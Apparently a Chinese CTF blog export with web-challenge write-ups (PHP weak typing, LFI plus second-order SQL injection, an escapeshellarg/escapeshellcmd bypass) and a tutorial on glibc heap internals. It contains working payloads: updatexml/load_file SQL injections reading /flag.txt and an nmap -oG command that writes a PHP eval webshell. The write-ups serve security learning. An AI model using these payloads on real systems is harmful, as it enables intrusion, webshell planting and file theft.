<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>f12有源码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">	$password = $_POST[&apos;password&apos;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&apos;t be number&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password == 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>1:一亿美元用科学计数法,money=9e9<br>2:密码要正确,必须是404,切不为数字,弱类型,password=404a</p>
<p>3:cuir身份,看见cookie的user值为0,猜测为1即可</p>
<h2 id="ciscn2019华北赛区半决赛day1web5CyberPunk"><a href="#ciscn2019华北赛区半决赛day1web5CyberPunk" class="headerlink" title="ciscn2019华北赛区半决赛day1web5CyberPunk"></a>ciscn2019华北赛区半决赛day1web5CyberPunk</h2><p>f12有提示,应该是个文件包含,可以LFI用base64读一波文件</p>
<p>index.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;open_basedir&apos;, &apos;/var/www/html/&apos;);</span><br><span class="line"></span><br><span class="line">// $file = $_GET[&quot;file&quot;];</span><br><span class="line">$file = (isset($_GET[&apos;file&apos;]) ? $_GET[&apos;file&apos;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;</span><br><span class="line">        echo(&apos;no way!&apos;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//HTML页面的代码省略，保留之前说的注释</span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>

<p>change.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#change.php</span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &apos;&apos;;</span><br><span class="line">    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &apos;no sql inject!&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;è®¢åä</span><br></pre></td></tr></table></figure>

<p>search.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#search.php</span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &apos;&apos;;</span><br><span class="line">    $pattern = &apos;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&apos;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = &apos;no sql inject!&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&apos;&#123;$user_name&#125;&apos; and `phone`=&apos;&#123;$phone&#125;&apos;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;&lt;p&gt;å§å:&quot;.$row[&apos;user_name&apos;].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&apos;phone&apos;].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row[&apos;address&apos;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;æªæ¾å°è®¢å!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>所有的查询的地方都对username以及phone做了十分严格的过滤,但是对addres只是做了简单的转义.考虑对address下手.<br>看过大佬wp后有了思路,从下面入手:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$address = addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = &quot;update `user` set `address`=&apos;&quot;.$address.&quot;&apos;, `old_address`=&apos;&quot;.$row[&apos;address&apos;].&quot;&apos; where `user_id`=&quot;.$row[&apos;user_id&apos;];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &apos;error&apos;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，address会被转义，然后进行更新，也就是说单引号之类的无效了。但是，在地址被更新的同时，旧地址被存了下来。如果第一次修改地址的时候，构造一个含SQL语句特殊的payload，然后在第二次修改的时候随便更新一个正常的地址，那个之前没有触发SQL注入的payload就会被触发。<br>思路有了以后，接下来就是构造payload，下面将借助报错注入来构造payload。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&apos; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&apos;/flag.txt&apos;),1,20)),0x7e),1)#</span><br><span class="line">直接load_file不能显示全，这里分两次构造payload。</span><br><span class="line">1&apos; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&apos;/flag.txt&apos;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure>

<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018] Online Tool"></a>[BUUCTF 2018] Online Tool</h2><p>进去直接有源码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) &#123;</span><br><span class="line">    $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">if(!isset($_GET[&apos;host&apos;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&apos;host&apos;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    echo &apos;you are in sandbox &apos;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>escapeshellarg()和escapeshellcmd() 没见过，百度<br>PHP escapeshellarg()+escapeshellcmd() 之殇</p>
<p>直接找到了上面这篇文章，这两个函数在一起用会有些问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&apos; -v -d a=1</span><br><span class="line">经过escapeshellarg处理后变成了&apos;172.17.0.2&apos;\&apos;&apos; -v -d a=1&apos;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&apos;172.17.0.2&apos;\\&apos;&apos; -v -d a=1\&apos;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &apos;172.17.0.2&apos;\\&apos;&apos; -v -d a=1\&apos;，由于中间的\\被解释为\而不再是转义字符，所以后面的&apos;没有被转义，与再后面的&apos;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&apos;，即向172.17.0.2\发起请求，POST 数据为a=1&apos;。</span><br></pre></td></tr></table></figure>

<p>简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题</p>
<p>然后往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
<p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p>
<p>这时候就只有想想能不能利用nmap来做些什么了。</p>
<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host=&apos; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &apos;</span><br></pre></td></tr></table></figure>

<p>执行后会返回文件夹名,连一下找到flag.</p>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>heap</title>
    <url>/2019/12/25/heap/</url>
    <content><![CDATA[<h1 id="pwn-heap"><a href="#pwn-heap" class="headerlink" title="pwn-heap"></a>pwn-heap</h1><a id="more"></a>
<h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器.</p>
<p>堆管理器处于用户程序与内核中间，主要做以下工作:</p>
<ul>
<li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
<li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li>
</ul>
<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p>
<p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><p>这里我们主要介绍</p>
<ul>
<li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用</li>
<li>介绍堆目前的多线程支持。<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3>在 glibc 的 malloc.c 中，malloc 的说明如下<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  malloc(size_t n)</span><br><span class="line">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="line">  if no space is available. Additionally, on failure, errno is</span><br><span class="line">  set to ENOMEM on ANSI C systems.</span><br><span class="line">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="line">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="line">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="line">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="line">  of space, which will often fail. The maximum supported value of n</span><br><span class="line">  differs across systems, but is in all cases less than the maximum</span><br><span class="line">  representable value of a size_t.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理:</p>
<ul>
<li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3>在 glibc 的 malloc.c 中，free 的说明如下<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">      free(void* p)</span><br><span class="line">      Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="line">      allocated using malloc or a related routine such as realloc.</span><br><span class="line">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="line">      effects if p has already been freed.</span><br><span class="line">      Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="line">      when possible, automatically trigger operations that give</span><br><span class="line">      back unused memory to the system, thus reducing program footprint.</span><br><span class="line">    */</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p>
<p>此外，该函数也同样对异常情况进行了处理:</p>
<ul>
<li>当 p 为空指针时，函数不执行任何操作。</li>
<li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。</li>
<li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。<h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</li>
</ul>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同:</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* sbrk and brk example */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        void *curr_brk, *tmp_brk = NULL;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</span><br><span class="line"></span><br><span class="line">        /* sbrk(0) gives current program break location */</span><br><span class="line">        tmp_brk = curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        /* brk(addr) increments/decrements program break location */</span><br><span class="line">        brk(curr_brk+4096);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>需要注意的是，在每一次执行完操作后，都执行了 getchar() 函数，这是为了我们方便我们查看程序真正的映射。</p>
<h3 id="在第一次调用-brk-之前"><a href="#在第一次调用-brk-之前" class="headerlink" title="在第一次调用 brk 之前"></a>在第一次调用 brk 之前</h3><p>从下面的输出可以看出，并没有出现堆。因此</p>
<ul>
<li>start_brk = brk = end_data = 0x804b000<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="第一次增加-brk-后"><a href="#第一次增加-brk-后" class="headerlink" title="第一次增加 brk 后"></a>第一次增加 brk 后</h3><p>从下面的输出可以看出，已经出现了堆段</p>
<ul>
<li>start_brk = end_data = 0x804b000</li>
<li>brk = 0x804c000<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk</span><br><span class="line">Welcome to sbrk example:6141</span><br><span class="line">Program Break Location1:0x804b000</span><br><span class="line">Program Break Location2:0x804c000</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6141/maps</span><br><span class="line">...</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539624     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</span><br><span class="line">0804b000-0804c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>其中，关于堆的那一行:</p>
<ul>
<li>0x0804b000 是相应堆的起始地址</li>
<li>rw-p 表明堆具有可读可写权限，并且属于隐私数据。</li>
<li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为 0。</li>
<li>00:00 是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为 0。</li>
<li>0 表示着 Inode 号。由于这部分内容并不是从文件中映射得到的，所以为 0。<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* Private anonymous mapping example using mmap syscall */</span><br><span class="line">##include &lt;stdio.h&gt;</span><br><span class="line">##include &lt;sys/mman.h&gt;</span><br><span class="line">##include &lt;sys/types.h&gt;</span><br><span class="line">##include &lt;sys/stat.h&gt;</span><br><span class="line">##include &lt;fcntl.h&gt;</span><br><span class="line">##include &lt;unistd.h&gt;</span><br><span class="line">##include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void static inline errExit(const char* msg)</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</span><br><span class="line">        exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        int ret = -1;</span><br><span class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</span><br><span class="line">        printf(&quot;Before mmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        char* addr = NULL;</span><br><span class="line">        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">        if (addr == MAP_FAILED)</span><br><span class="line">                errExit(&quot;mmap&quot;);</span><br><span class="line">        printf(&quot;After mmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        /* Unmap mapped region. */</span><br><span class="line">        ret = munmap(addr, (size_t)132*1024);</span><br><span class="line">        if(ret == -1)</span><br><span class="line">                errExit(&quot;munmap&quot;);</span><br><span class="line">        printf(&quot;After munmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="在执行-mmap-之前"><a href="#在执行-mmap-之前" class="headerlink" title="在执行 mmap 之前"></a>在执行 mmap 之前</h3><p>我们可以从下面的输出看到，目前只有. so 文件的 mmap 段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

<h3 id="mmap-后"><a href="#mmap-后" class="headerlink" title="mmap 后"></a>mmap 后</h3><p>从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了 b7e00000 到 b7e21000 的 mmap 段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e00000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

<h3 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h3><p>从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</span><br><span class="line">b7e21000-b7e22000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</span><br></pre></td></tr></table></figure>

<h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p>
<p>这里给出一个例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* Per thread arena example. */</span><br><span class="line">##include &lt;stdio.h&gt;</span><br><span class="line">##include &lt;stdlib.h&gt;</span><br><span class="line">##include &lt;pthread.h&gt;</span><br><span class="line">##include &lt;unistd.h&gt;</span><br><span class="line">##include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">void* threadFunc(void* arg) &#123;</span><br><span class="line">        printf(&quot;Before malloc in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        char* addr = (char*) malloc(1000);</span><br><span class="line">        printf(&quot;After malloc and before free in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(addr);</span><br><span class="line">        printf(&quot;After free in thread 1\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">        pthread_t t1;</span><br><span class="line">        void* s;</span><br><span class="line">        int ret;</span><br><span class="line">        char* addr;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Welcome to per thread arena example::%d\n&quot;,getpid());</span><br><span class="line">        printf(&quot;Before malloc in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (char*) malloc(1000);</span><br><span class="line">        printf(&quot;After malloc and before free in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        free(addr);</span><br><span class="line">        printf(&quot;After free in main thread\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, NULL, threadFunc, NULL);</span><br><span class="line">        if(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Thread creation error\n&quot;);</span><br><span class="line">                return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        if(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Thread join error\n&quot;);</span><br><span class="line">                return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次申请之前， 没有任何任何堆段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

